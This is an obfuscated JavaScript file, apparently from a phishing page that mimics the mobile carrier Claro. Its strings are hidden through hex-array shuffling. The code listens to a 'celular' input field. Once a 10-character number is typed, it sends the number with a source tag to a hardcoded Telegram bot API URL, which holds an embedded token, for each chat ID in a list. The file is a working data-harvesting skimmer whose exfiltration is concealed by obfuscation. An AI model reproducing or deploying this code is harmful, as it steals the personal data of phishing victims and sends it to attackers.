const _0x3e8ea4 = _0x39a0;
(function (_0x5034f7, _0x39d1a3) {
  const _0x1903bf = _0x39a0,
    _0x4355e5 = _0x5034f7();
  while (!![]) {
    try {
      const _0x1c2fbe =
        -parseInt(_0x1903bf(0xf2)) / 0x1 +
        parseInt(_0x1903bf(0x108)) / 0x2 +
        (parseInt(_0x1903bf(0xf9)) / 0x3) *
          (-parseInt(_0x1903bf(0x105)) / 0x4) +
        (parseInt(_0x1903bf(0xef)) / 0x5) * (parseInt(_0x1903bf(0xfa)) / 0x6) +
        parseInt(_0x1903bf(0x109)) / 0x7 +
        (-parseInt(_0x1903bf(0x101)) / 0x8) *
          (-parseInt(_0x1903bf(0x104)) / 0x9) +
        -parseInt(_0x1903bf(0x10a)) / 0xa;
      if (_0x1c2fbe === _0x39d1a3) break;
      else _0x4355e5["push"](_0x4355e5["shift"]());
    } catch (_0x47cf47) {
      _0x4355e5["push"](_0x4355e5["shift"]());
    }
  }
})(_0x28b3, 0x60de3);
function _0x28b3() {
  const _0x5d5465 = [
    "6fziVYB",
    "212pqnRkg",
    "8GHDNDb",
    "104zvalqy",
    "error",
    "6598521mTmmSR",
    "12thOsFF",
    "push",
    "446kfqtVk",
    "480530JCBzXC",
    "2829365FoKtBx",
    "5989670uFZpbz",
    "1635100SIMziQ",
    "1040494QKuLUc",
    "66225UYzBtM",
    "Error\x20de\x20red:",
    "addEventListener",
    "726444lIsRMR",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(Chat\x20ID:\x20",
    "566yuvRYX",
    "getElementById",
    "DOMContentLoaded",
    "12213otJOAT",
    "436902biIkeh",
    "354AjomWj",
    "6531gRKnfl",
    "shift",
    "1060257qCEEPg",
    "Error\x20al\x20enviar\x20mensaje\x20al\x20Chat\x20ID\x20",
  ];
  _0x28b3 = function () {
    return _0x5d5465;
  };
  return _0x28b3();
}
const _0x7c1cdb = _0x4a5c;
(function (_0x4a2f9f, _0x39b86b) {
  const _0x237797 = _0x39a0,
    _0x2a4327 = _0x4a5c,
    _0x1e7066 = _0x4a2f9f();
  while (!![]) {
    try {
      const _0x268ff2 =
        (parseInt(_0x2a4327(0x1a0)) / 0x1) *
          (-parseInt(_0x2a4327(0x1a2)) / 0x2) +
        (-parseInt(_0x2a4327(0x1b0)) / 0x3) *
          (parseInt(_0x2a4327(0x19e)) / 0x4) +
        (-parseInt(_0x2a4327(0x1b1)) / 0x5) *
          (parseInt(_0x2a4327(0x1ad)) / 0x6) +
        parseInt(_0x2a4327(0x1aa)) / 0x7 +
        (parseInt(_0x2a4327(0x19f)) / 0x8) *
          (parseInt(_0x2a4327(0x1a5)) / 0x9) +
        parseInt(_0x2a4327(0x1af)) / 0xa +
        parseInt(_0x2a4327(0x1ab)) / 0xb;
      if (_0x268ff2 === _0x39b86b) break;
      else _0x1e7066[_0x237797(0x106)](_0x1e7066[_0x237797(0xfc)]());
    } catch (_0x6fe45f) {
      _0x1e7066[_0x237797(0x106)](_0x1e7066[_0x237797(0xfc)]());
    }
  }
})(_0x1f0e, 0x1d2eb);
function _0x39a0(_0x29d315, _0x2df9c3) {
  const _0x28b377 = _0x28b3();
  return (
    (_0x39a0 = function (_0x39a0e2, _0x3305ae) {
      _0x39a0e2 = _0x39a0e2 - 0xee;
      let _0x54f51b = _0x28b377[_0x39a0e2];
      return _0x54f51b;
    }),
    _0x39a0(_0x29d315, _0x2df9c3)
  );
}
let messageSent = ![];
async function sendToTelegram() {
  const _0x11b8e0 = _0x39a0,
    _0x201c36 = _0x4a5c,
    _0x275f28 = document[_0x11b8e0(0xf6)](_0x201c36(0x1ae)),
    _0x3b077e = _0x275f28["value"];
  if (_0x3b077e["length"] === 0xa && !messageSent) {
    messageSent = !![];
    const _0x24c722 = _0x201c36(0x1a7) + _0x3b077e + "\x0aFuente:\x20" + fuente;
    try {
      for (const _0x48b852 of chatIds) {
        const _0x5c167a =
            _0x11b8e0(0xf3) +
            _0x48b852 +
            _0x201c36(0x1a3) +
            encodeURIComponent(_0x24c722),
          _0x2362c0 = await fetch(_0x5c167a);
        _0x2362c0["ok"]
          ? console["log"](_0x201c36(0x1ac) + _0x48b852 + ")")
          : console[_0x201c36(0x1a8)](
              _0x201c36(0x1a6) + _0x48b852 + ":",
              _0x2362c0[_0x201c36(0x1a9)]
            );
      }
      messageSent = ![];
    } catch (_0x229f4a) {
      console[_0x201c36(0x1a8)](_0x201c36(0x1a1), _0x229f4a);
    }
  }
}
document[_0x7c1cdb(0x1a4)](_0x3e8ea4(0xf7), function () {
  const _0x38d523 = _0x7c1cdb,
    _0xb4c809 = document["getElementById"](_0x38d523(0x1ae));
  _0xb4c809[_0x38d523(0x1a4)]("input", sendToTelegram);
});
function _0x4a5c(_0x352378, _0x201808) {
  const _0x599439 = _0x1f0e();
  return (
    (_0x4a5c = function (_0x4f5f02, _0x36979f) {
      _0x4f5f02 = _0x4f5f02 - 0x19e;
      let _0x3fad0c = _0x599439[_0x4f5f02];
      return _0x3fad0c;
    }),
    _0x4a5c(_0x352378, _0x201808)
  );
}
function _0x1f0e() {
  const _0x1a48c9 = _0x3e8ea4,
    _0x5d9a28 = [
      _0x1a48c9(0xff),
      "celular",
      _0x1a48c9(0x10b),
      _0x1a48c9(0xfb),
      "325250XWzBap",
      _0x1a48c9(0x100),
      _0x1a48c9(0x102),
      _0x1a48c9(0x107),
      _0x1a48c9(0xf0),
      _0x1a48c9(0xf5),
      "&text=",
      _0x1a48c9(0xf1),
      _0x1a48c9(0xf8),
      _0x1a48c9(0xfe),
      "🔴\x20Celular\x20Claro:\x20",
      _0x1a48c9(0x103),
      "statusText",
      _0x1a48c9(0xee),
      _0x1a48c9(0xfd),
      _0x1a48c9(0xf4),
    ];
  return (
    (_0x1f0e = function () {
      return _0x5d9a28;
    }),
    _0x1f0e()
  );
}
